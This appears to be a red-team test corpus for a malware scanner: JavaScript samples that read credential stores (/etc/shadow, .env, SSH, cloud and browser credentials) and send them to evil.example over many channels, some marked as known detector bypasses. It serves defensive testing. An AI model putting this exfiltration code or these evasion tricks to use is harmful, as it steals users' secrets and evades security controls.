// red-team/corpus/credential-exfil-extended.js
// Extended credential/secret theft variants across secret stores and egress channels.

module.exports = [
  // ── Covered: sensitive path + a recognised egress channel (expected BLOCK) ───
  {
    id: 'exfil-etc-shadow',
    category: 'credential-exfil', technique: 'shadow-file-theft', severity: 'CRITICAL',
    expected: 'BLOCK',
    description: 'Reads /etc/shadow and posts it out',
    code: `
      const fs = require('fs');
      const s = fs.readFileSync('/etc/shadow', 'utf8');
      fetch('https://evil.example/s', { method: 'POST', body: s });
      module.exports = {};
    `,
  },
  {
    id: 'exfil-etc-passwd',
    category: 'credential-exfil', technique: 'passwd-file-theft', severity: 'CRITICAL',
    expected: 'BLOCK',
    description: 'Reads /etc/passwd and GETs it to a host',
    code: `
      const fs = require('fs');
      const p = fs.readFileSync('/etc/passwd', 'utf8');
      require('https').get('https://evil.example/p?d=' + encodeURIComponent(p));
      module.exports = {};
    `,
  },
  {
    id: 'exfil-git-credentials',
    category: 'credential-exfil', technique: 'git-credentials-theft', severity: 'CRITICAL',
    expected: 'BLOCK',
    description: 'Reads ~/.git-credentials (matches the /credentials path signal) and exfiltrates',
    code: `
      const fs = require('fs');
      const g = fs.readFileSync(require('os').homedir() + '/.git-credentials', 'utf8');
      fetch('https://evil.example/g', { method: 'POST', body: g });
      module.exports = {};
    `,
  },
  {
    id: 'exfil-env-websocket',
    category: 'credential-exfil', technique: 'env-file-websocket-egress', severity: 'CRITICAL',
    expected: 'BLOCK',
    description: 'Reads .env and streams it over a WebSocket',
    code: `
      const fs = require('fs');
      const e = fs.readFileSync('.env', 'utf8');
      const ws = new WebSocket('wss://evil.example/x');
      ws.onopen = () => ws.send(e);
      module.exports = {};
    `,
  },
  {
    id: 'exfil-netrc-tls',
    category: 'credential-exfil', technique: 'netrc-tls-egress', severity: 'CRITICAL',
    expected: 'BLOCK',
    description: 'Reads ~/.netrc and ships it over a raw tls.connect socket',
    code: `
      const fs = require('fs');
      const tls = require('tls');
      const n = fs.readFileSync(require('os').homedir() + '/.netrc', 'utf8');
      const sock = tls.connect(443, 'evil.example', () => sock.write(n));
      module.exports = {};
    `,
  },
  {
    id: 'exfil-idrsa-dgram',
    category: 'credential-exfil', technique: 'ssh-key-udp-egress', severity: 'CRITICAL',
    expected: 'BLOCK',
    description: 'Reads id_rsa and exfiltrates it over UDP (dgram)',
    code: `
      const fs = require('fs');
      const dgram = require('dgram');
      const k = fs.readFileSync(process.env.HOME + '/.ssh/id_rsa');
      const u = dgram.createSocket('udp4');
      u.send(k, 53, 'evil.example');
      module.exports = {};
    `,
  },
  {
    id: 'exfil-gcp-adc',
    category: 'credential-exfil', technique: 'gcp-adc-theft', severity: 'CRITICAL',
    expected: 'BLOCK',
    description: 'Reads GCP application_default_credentials.json (matches /credentials) and exfiltrates',
    code: `
      const fs = require('fs');
      const c = fs.readFileSync(process.env.HOME + '/.config/gcloud/application_default_credentials.json', 'utf8');
      fetch('https://evil.example/gcp', { method: 'POST', body: c });
      module.exports = {};
    `,
  },
  {
    id: 'exfil-secret-xhr',
    category: 'credential-exfil', technique: 'secret-file-xhr-egress', severity: 'CRITICAL',
    expected: 'BLOCK',
    description: 'Reads a *secret* file (matches /secret) and exfiltrates via XMLHttpRequest',
    code: `
      const fs = require('fs');
      const s = fs.readFileSync('/run/secrets/app_secret', 'utf8');
      const x = new XMLHttpRequest();
      x.open('POST', 'https://evil.example/s'); x.send(s);
      module.exports = {};
    `,
  },
  {
    id: 'exfil-aws-netconnect',
    category: 'credential-exfil', technique: 'aws-net-connect-egress', severity: 'CRITICAL',
    expected: 'BLOCK',
    description: 'Reads ~/.aws/credentials and pushes it through a raw net.connect socket',
    code: `
      const fs = require('fs');
      const net = require('net');
      const a = fs.readFileSync(require('os').homedir() + '/.aws/credentials', 'utf8');
      const s = net.connect(9999, 'evil.example', () => s.write(a));
      module.exports = {};
    `,
  },
  {
    id: 'exfil-env-async-read',
    category: 'credential-exfil', technique: 'async-read-env', severity: 'CRITICAL',
    expected: 'BLOCK',
    description: 'fs.promises.readFile(.env) + fetch — the async read method does not matter, the .env path signal + egress still fires CREDENTIAL_EXFILTRATION',
    code: `
      const fs = require('fs');
      (async () => {
        const e = await fs.promises.readFile('.env', 'utf8');
        await fetch('https://evil.example/e', { method: 'POST', body: e });
      })();
      module.exports = {};
    `,
  },
  {
    id: 'exfil-passwd-createReadStream',
    category: 'credential-exfil', technique: 'passwd-stream-egress', severity: 'CRITICAL',
    expected: 'BLOCK',
    description: 'Streams /etc/passwd via a hardcoded https.request to an exfil host',
    code: `
      const req = require('https').request('https://evil.example/up', { method: 'POST' });
      require('fs').createReadStream('/etc/passwd').pipe(req);
      module.exports = {};
    `,
  },

  // ── Uncovered secret stores / evasion channels (known bypass) ────────────────
  {
    id: 'exfil-docker-config',
    category: 'credential-exfil', technique: 'docker-config-theft', severity: 'CRITICAL',
    expected: 'BLOCK', knownBypass: false, // closed: SENSITIVE_CONFIG_PATH + hardcoded-egress rule (Phase 1)
    description: 'Reads ~/.docker/config.json (registry auth) — path is not in the SENSITIVE_PATH set',
    code: `
      const fs = require('fs');
      const d = fs.readFileSync(require('os').homedir() + '/.docker/config.json', 'utf8');
      fetch('https://evil.example/d', { method: 'POST', body: d });
      module.exports = {};
    `,
  },
  {
    id: 'exfil-kube-config',
    category: 'credential-exfil', technique: 'kubeconfig-theft', severity: 'CRITICAL',
    expected: 'BLOCK', knownBypass: false, // closed: SENSITIVE_CONFIG_PATH + hardcoded-egress rule (Phase 1)
    description: 'Reads ~/.kube/config (cluster tokens) — not in the SENSITIVE_PATH set',
    code: `
      const fs = require('fs');
      const k = fs.readFileSync(require('os').homedir() + '/.kube/config', 'utf8');
      fetch('https://evil.example/k', { method: 'POST', body: k });
      module.exports = {};
    `,
  },
  {
    id: 'exfil-id-ecdsa',
    category: 'credential-exfil', technique: 'ecdsa-key-theft', severity: 'CRITICAL',
    expected: 'BLOCK', knownBypass: true,
    description: 'Reads id_ecdsa — only id_rsa is a literal path signal, so other key types slip through',
    code: `
      const fs = require('fs');
      const k = fs.readFileSync(process.env.HOME + '/.ssh/id_ecdsa', 'utf8');
      fetch('https://evil.example/e', { method: 'POST', body: k });
      module.exports = {};
    `,
  },
  {
    id: 'exfil-browser-cookies',
    category: 'credential-exfil', technique: 'browser-cookie-theft', severity: 'CRITICAL',
    expected: 'BLOCK', knownBypass: false, // closed: SENSITIVE_CONFIG_PATH (Login Data) + hardcoded-egress rule (Phase 1)
    description: 'Reads the Chrome "Login Data" SQLite store — path not covered by SENSITIVE_PATH',
    code: `
      const fs = require('fs');
      const c = fs.readFileSync(process.env.HOME + '/.config/google-chrome/Default/Login Data');
      fetch('https://evil.example/c', { method: 'POST', body: c });
      module.exports = {};
    `,
  },
  {
    id: 'exfil-env-via-curl',
    category: 'credential-exfil', technique: 'exfil-through-shell', severity: 'CRITICAL',
    expected: 'BLOCK', knownBypass: true,
    description: 'Reads .env then exfiltrates by shelling out to curl — the outbound call is a child_process, not a recognised NETWORK_EGRESS primitive, so the credential rule never fires',
    code: `
      const fs = require('fs');
      const e = fs.readFileSync('.env', 'utf8');
      require('child_process').exec('curl -d "' + e + '" https://evil.example/e');
      module.exports = {};
    `,
  },
  {
    id: 'exfil-env-sendbeacon',
    category: 'credential-exfil', technique: 'navigator-sendbeacon', severity: 'CRITICAL',
    expected: 'BLOCK', knownBypass: false, // closed: navigator.sendBeacon added to NETWORK_EGRESS (Phase 2)
    description: 'Reads .env and exfiltrates via navigator.sendBeacon — not in the NETWORK_EGRESS set',
    code: `
      const fs = require('fs');
      const e = fs.readFileSync('.env', 'utf8');
      navigator.sendBeacon('https://evil.example/b', e);
      module.exports = {};
    `,
  },
  {
    id: 'exfil-inline-require-net',
    category: 'credential-exfil', technique: 'inline-require-egress-evasion', severity: 'CRITICAL',
    expected: 'BLOCK', knownBypass: false, // closed: inline require("net") added to NETWORK_EGRESS (Phase 1)
    description: 'Reads ~/.aws/credentials and exfiltrates via an INLINE require("net").connect(...) call. The NETWORK_EGRESS regexes match a bound `net.connect(` but not the inline `require("net").connect(` form — only http/https have a dedicated inline-require pattern — so egress is not detected and CREDENTIAL_EXFILTRATION never fires. (Compare exfil-aws-netconnect, which uses the bound form and IS blocked.)',
    code: `
      const fs = require('fs');
      const a = fs.readFileSync(require('os').homedir() + '/.aws/credentials', 'utf8');
      const s = require('net').connect(9999, 'evil.example', () => s.write(a));
      module.exports = {};
    `,
  },
  {
    id: 'exfil-concat-etc-shadow',
    category: 'credential-exfil', technique: 'concat-path-evasion', severity: 'CRITICAL',
    expected: 'BLOCK', knownBypass: true,
    description: 'Sensitive path assembled from fragments so no literal matches SENSITIVE_PATH',
    code: `
      const fs = require('fs');
      const p = '/etc/' + 'sha' + 'dow';
      const s = fs.readFileSync(p, 'utf8');
      fetch('https://evil.example/s', { method: 'POST', body: s });
      module.exports = {};
    `,
  },
];
